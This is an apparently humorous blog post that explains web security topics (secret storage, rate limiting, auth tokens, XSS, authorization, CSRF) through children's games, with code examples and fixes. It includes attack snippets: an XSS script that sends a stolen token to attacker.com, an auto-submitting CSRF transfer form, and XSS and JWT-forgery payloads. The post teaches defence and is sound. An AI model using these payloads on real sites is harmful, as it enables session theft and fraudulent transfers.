---
layout: post
unique_id: WEB08

title: Playing Hide and Seek with Your API Keys
subtitle: A children's game guide to security concepts
tldr: Security concepts explained through children's games - hiding secrets (hide and seek), rate limiting (musical chairs), auth tokens (tag you're it), XSS attacks (telephone game gone wrong). Learn security by playing games.
# permalink: /blog/web/security-games
author: srungta
tags:
  - Web
  - Security
  - System Design
  - Humor

series:
  id: STARTRIGHT
  index: 3
---


## Security is Just Games We Played as Kids

Remember playing hide and seek? Tag? Simon Says? Red light, green light?

Turns out, web security is the same thing.

Let's explain security concepts using children's games. Because if you can't explain it to a kid, you don't really understand it.

## Hide and Seek: Where to Hide Your Secrets

### The Game

One person counts while everyone else hides. The seeker tries to find everyone.

### The Security Concept

You have secrets (API keys, passwords, tokens). Attackers are trying to find them.

### Bad Hiding Spots (Where Everyone Looks First)

**1. In plain sight (hardcoded in client code)**

```javascript
const API_KEY = "sk_live_51Hcb2x3y4z5..."; // Right there in the JavaScript

fetch('https://api.stripe.com/v1/charges', {
  headers: { 'Authorization': `Bearer ${API_KEY}` }
});
```

**Why it's bad:** Everyone can see JavaScript. Open DevTools → Sources → There's your key.

**Game equivalent:** Hiding behind a clear glass door.

**2. In the closet (environment variables in client-side builds)**

```javascript
// .env file
REACT_APP_API_KEY=sk_live_51Hcb2x3y4z5...

// Built into your bundle
const API_KEY = process.env.REACT_APP_API_KEY;
```

**Why it's bad:** Environment variables get baked into your client bundle during build. Still visible in production.

**Game equivalent:** Hiding in the same closet every single time.

**3. Under the bed (in git history)**

```javascript
// .env
API_KEY=sk_live_51Hcb2x3y4z5...

// Later: Oh no, I committed it!
// Remove it and push again

// But it's still in git history forever
git log --all --full-history -- .env
```

**Why it's bad:** Git never forgets. Even deleted files are in history.

**Game equivalent:** Hiding in a spot, leaving a trail of breadcrumbs leading directly to you.

### Good Hiding Spots

**1. In the attic (server-side only)**

```javascript
// Server-side (Node.js)
const API_KEY = process.env.API_KEY; // Only on server

app.post('/api/charge', async (req, res) => {
  const charge = await stripe.charges.create({
    amount: req.body.amount,
    // API key never leaves the server
  }, {
    apiKey: API_KEY
  });
});
```

**Why it's good:** Client never sees the key. Attacker can't find it without accessing your server.

**Game equivalent:** Hiding in a room that's locked.

**2. In a secret vault (secret management services)**

```javascript
// AWS Secrets Manager
const secret = await secretsManager.getSecretValue({ 
  SecretId: 'prod/api/stripe' 
}).promise();

const API_KEY = JSON.parse(secret.SecretString).apiKey;
```

**Why it's good:**
- Keys are encrypted
- Access is logged
- Can rotate keys without changing code
- Can revoke access instantly

**Game equivalent:** Hiding in a vault that requires three keys and a fingerprint to open.

### The Lesson

**Seekers (attackers) always check:**
1. Client-side JavaScript
2. HTML source
3. Network requests
4. Git history
5. Public repositories

**Good hiding means:**
- Keep secrets server-side
- Never commit secrets
- Rotate secrets regularly
- Use secret management tools

## Musical Chairs: Rate Limiting

### The Game

Music plays. When it stops, everyone rushes to sit. There aren't enough chairs. Someone gets eliminated.

### The Security Concept

You have limited resources (API calls, database connections, CPU time). Users want to use them all. You need to enforce limits.

### Why You Need Rate Limiting

**Without rate limiting:**

```javascript
// Attacker's code
while (true) {
  fetch('https://yourapi.com/expensive-query');
}

// Your server: *dies*
```

**With rate limiting:**

```javascript
// After 100 requests per minute
Response: 429 Too Many Requests
Retry-After: 60 seconds

// Attacker's requests are rejected
// Your server: *survives*
```

### Types of Musical Chairs (Rate Limiting Strategies)

**1. Fixed window (Rounds of the game)**

```
Minute 1: User gets 100 requests
Minute 2: Counter resets, user gets 100 more requests
```

**Problem:** Burst at boundary

```
Minute 1 (last second): 100 requests
Minute 2 (first second): 100 requests
= 200 requests in 2 seconds (spike!)
```

**Game equivalent:** Everyone rushes right when the music starts.

**2. Sliding window (Continuous game)**

```
At any given moment, count requests in last 60 seconds
If count > 100, reject
```

**Better:** No boundary burst problem. Smooth enforcement.

**Game equivalent:** Chairs appear and disappear continuously.

**3. Token bucket (Chairs refill over time)**

```
Start with 100 tokens
Each request costs 1 token
Tokens refill at 10/second
```

**Good for:** Allowing bursts while maintaining average rate.

```
User makes 100 requests instantly (uses all tokens)
User waits 10 seconds (100 tokens refill)
User can burst again
```

**Game equivalent:** Chairs regenerate over time.

**4. Per-user limits (Personal chairs)**

```
User A: 100 requests/minute
User B: 100 requests/minute
One user can't exhaust resources for everyone
```

**Game equivalent:** Everyone gets their own chair. You can only lose your own chair.

### When Musical Chairs Gets Complicated

**Distributed systems:**

```
Server 1: User has made 50 requests
Server 2: User has made 60 requests
Total: 110 requests (over limit!)

But each server thinks user is under limit.
```

**Solution:** Shared rate limiting (Redis)

```javascript
const count = await redis.incr(`rate:${userId}:${minute}`);
if (count === 1) {
  await redis.expire(`rate:${userId}:${minute}`, 60);
}
if (count > 100) {
  throw new Error('Rate limit exceeded');
}
```

### The Lesson

**Musical chairs teaches:**
- Resources are limited
- You need rules about who gets what
- Enforce limits fairly
- Plan for people trying to cheat (spam requests)

## Tag, You're It: Authentication Tokens

### The Game

One person is "it." They chase everyone else. When they tag someone, that person becomes "it."

### The Security Concept

Authentication tokens prove you're "it" (authenticated). You pass the token between requests.

### How the Game Works

**1. Login (become "it")**

```javascript
POST /login
{ "username": "alice", "password": "secret123" }

Response: { "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." }

// You're now "it" (authenticated)
```

**2. Make requests (prove you're "it")**

```javascript
GET /api/profile
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

// Server checks: "Yep, you're it. Here's your data."
```

**3. Logout (not "it" anymore)**

```javascript
POST /logout

// Server invalidates token
// You're no longer "it"
```

### Types of Tags (Token Types)

**1. Session tokens (Wristbands)**

```javascript
// Server stores: { sessionId: "abc123", userId: 42 }
// Cookie contains: sessionId=abc123

// Server looks up: "Session abc123 belongs to user 42"
```

**Pros:** Server controls everything. Can revoke anytime.

**Cons:** Requires server storage. Doesn't scale easily.

**Game equivalent:** You get a wristband. Referee checks the wristband list.

**2. JWTs (Self-contained tags)**

```javascript
// Token contains the data itself:
{
  "userId": 42,
  "exp": 1672531200,
  "iat": 1672444800
}
// Signed by server so it can't be forged
```

**Pros:** No server storage needed. Scales easily.

**Cons:** Can't revoke until expiration. Larger than session IDs.

**Game equivalent:** You wear a shirt that says "I'm it." Everyone can see it without asking the referee.

### Cheating at Tag (Token Security Issues)

**1. Stealing the tag (XSS)**

```javascript
// Attacker injects JavaScript
<script>
  // Steal token from localStorage
  const token = localStorage.getItem('authToken');
  fetch('https://attacker.com/steal?token=' + token);
</script>

// Attacker now has your token
// Attacker is "it" pretending to be you
```

**Prevention:** Use httpOnly cookies (JavaScript can't access them).

**2. Replaying the tag (token replay)**

```javascript
// Attacker intercepts your token
// Attacker uses it later

GET /api/profile
Authorization: Bearer [your token]

// Works! Attacker pretends to be you.
```

**Prevention:**
- Short expiration times
- HTTPS only (prevents interception)
- Refresh tokens (rotate frequently)

**3. Forging the tag (weak signing)**

```javascript
// JWT signed with weak secret: "secret"
// Attacker brute-forces the secret
// Attacker creates fake tokens

{
  "userId": 1, // Admin user
  "admin": true
}
// Signs with "secret"
// Server accepts it!
```

**Prevention:** Use strong secrets. Rotate keys regularly.

### The Lesson

**Tag teaches:**
- Tokens prove identity
- Tokens can be stolen
- Tokens can expire
- Protect tokens like passwords

## Telephone (Broken Telephone): XSS Attacks

### The Game

Everyone sits in a line. First person whispers a message. Each person whispers to the next. Last person says what they heard. It's always hilariously wrong.

### The Security Concept

User input gets passed through multiple systems. Along the way, it gets interpreted in unexpected ways.

### How the Message Gets Corrupted (XSS)

**Original message:** "I like puppies"

**User input:**
```javascript
const comment = "<script>alert('hacked')</script>";
```

**Server receives:** "User wants to post a comment"

**Server stores:** Literally saves `<script>alert('hacked')</script>` in database

**Another user views the page:**

```html
<div class="comment">
  <script>alert('hacked')</script>
</div>
```

**Browser interprets:** "Oh, a script tag! Let me execute this JavaScript!"

**Result:** JavaScript runs on innocent user's browser.

**Final message:** "hacked" (and possibly stolen session cookies)

### Types of Broken Telephone (XSS Types)

**1. Stored XSS (The message is written down)**

```javascript
// Attacker posts comment
POST /api/comments
{ "text": "<script>steal_cookies()</script>" }

// Server saves to database

// Later, victim views page
GET /comments
→ Returns attacker's script
→ Victim's browser executes it
```

**Game equivalent:** Someone writes the wrong message in permanent marker.

**2. Reflected XSS (The message bounces back)**

```javascript
// URL: https://site.com/search?q=<script>alert('xss')</script>

// Server responds:
<h1>Search results for: <script>alert('xss')</script></h1>

// Browser executes the script
```

**Game equivalent:** You whisper something, and it echoes back distorted.

**3. DOM-based XSS (The message corrupts inside your head)**

```javascript
// URL: https://site.com#<img src=x onerror=alert('xss')>

// Client-side JavaScript:
const hash = window.location.hash;
document.getElementById('output').innerHTML = hash;

// Browser executes injected code
```

**Game equivalent:** You misheard yourself.

### Preventing Telephone Corruption (XSS Prevention)

**1. Escape output (Speak clearly)**

```javascript
// Bad
div.innerHTML = userInput;

// Good
div.textContent = userInput;

// Or use a library
div.innerHTML = DOMPurify.sanitize(userInput);
```

**2. Content Security Policy (Game rules)**

```html
<meta http-equiv="Content-Security-Policy" 
      content="script-src 'self'; object-src 'none'">
```

Tells browser: "Only run scripts from my own domain. Ignore inline scripts."

**3. Validate input (Check the message before passing it)**

```javascript
// Reject suspicious input
if (/<script/i.test(userInput)) {
  throw new Error('Invalid input');
}
```

**4. Use frameworks that auto-escape (Professional telephone operators)**

```jsx
// React automatically escapes
<div>{userInput}</div> // Safe! React escapes HTML
```

### The Lesson

**Telephone teaches:**
- User input is dangerous
- Escaping is essential
- Context matters (HTML, JavaScript, URL)
- Never trust input, even from your own database

## Simon Says: Authorization

### The Game

Leader says "Simon says touch your nose" - everyone does it.  
Leader says "Touch your nose" (without "Simon says") - you shouldn't do it!

### The Security Concept

Authentication = knowing who you are  
Authorization = knowing what you're allowed to do

Just because you're authenticated doesn't mean you can do everything.

### Simon Says vs. Regular Commands

**Simon Says (Authorized):**

```javascript
// Admin user
DELETE /api/users/123

// Server checks: Is this user an admin?
// Yes → Delete allowed
```

**Regular command (Not Authorized):**

```javascript
// Regular user
DELETE /api/users/123

// Server checks: Is this user an admin?
// No → 403 Forbidden
```

### Common Authorization Mistakes

**1. Trusting the client (Player decides if it was "Simon Says")**

```javascript
// Client sends
DELETE /api/users/123?isAdmin=true

// Server trusts it
if (req.query.isAdmin) {
  deleteUser(123);
}

// ❌ ANYONE CAN SET isAdmin=true
```

**Fix:** Check permissions on server

```javascript
const user = getUserFromToken(req.headers.authorization);
if (user.role !== 'admin') {
  return res.status(403).json({ error: 'Forbidden' });
}
deleteUser(123);
```

**2. Checking authentication but not authorization**

```javascript
// User is logged in ✓
// But are they allowed to delete this specific user? ❌

DELETE /api/users/123

// Any logged-in user can delete any user
```

**Fix:** Check resource ownership

```javascript
const user = getUserFromToken(req.headers.authorization);
const targetUser = getUser(123);

if (user.id !== targetUser.id && user.role !== 'admin') {
  return res.status(403).json({ error: 'Forbidden' });
}
```

**3. IDOR (Insecure Direct Object Reference) - Wrong user ID**

```javascript
// Alice (user 42) makes request:
GET /api/profile?userId=43

// Server doesn't check if Alice should see user 43's profile
// Returns Bob's private data
```

**Fix:**

```javascript
const requestingUser = getUserFromToken(req.headers.authorization);
const requestedUserId = req.query.userId;

if (requestingUser.id !== requestedUserId && requestingUser.role !== 'admin') {
  return res.status(403).json({ error: 'Forbidden' });
}
```

### The Lesson

**Simon Says teaches:**
- Authentication ≠ Authorization
- Always check permissions on the server
- Validate not just WHO, but WHAT they can do
- Check resource ownership

## Red Light, Green Light: CSRF Protection

### The Game

When the leader says "green light," you run. When they say "red light," you stop. If you move during red light, you're out.

### The Security Concept

Requests should only happen when YOU initiate them, not when an attacker tricks your browser into making them.

### The Attack (Someone Else Shouts "Green Light")

```html
<!-- Attacker's website: evil.com -->
<form action="https://yourbank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000">
</form>
<script>
  document.forms[0].submit();
</script>
```

**What happens:**
1. You visit evil.com (while logged into yourbank.com)
2. Your browser automatically includes your yourbank.com cookies
3. Form submits to yourbank.com
4. Bank sees valid session cookie
5. Bank transfers $1000 to attacker

**Your browser obeyed "green light" from the wrong leader.**

### The Defense (Check Who Said "Green Light")

**CSRF Token (Secret phrase)**

```html
<!-- Your bank's form -->
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="randomSecretToken123">
  <input name="to">
  <input name="amount">
</form>
```

Server checks: "Did this request include the secret token?"

Attacker's site can't access your CSRF token (same-origin policy), so forged requests fail.

### The Lesson

**Red Light, Green Light teaches:**
- Verify the source of commands
- Don't trust requests just because they have cookies
- Use CSRF tokens for state-changing operations
- GET requests should never change data

## Key Takeaways

1. **Hide and Seek** - Keep secrets server-side
2. **Musical Chairs** - Rate limit to prevent resource exhaustion
3. **Tag** - Protect and validate authentication tokens
4. **Telephone** - Escape user input to prevent XSS
5. **Simon Says** - Check authorization, not just authentication
6. **Red Light, Green Light** - Use CSRF tokens for state-changing requests

## Conclusion

Security isn't scary. It's just games we played as kids, but with higher stakes.

Hide your secrets well. Don't let everyone play at once. Pass the auth token carefully. Don't let the message get corrupted. Check permissions before acting. Make sure commands come from the right source.

Master these games, and you'll master web security.

**Remember:** Every security vulnerability is just someone cheating at a game we thought everyone agreed to play fair.

---

*Have a creative way to explain security concepts? Caught someone cheating at these games in production? Share your stories.*
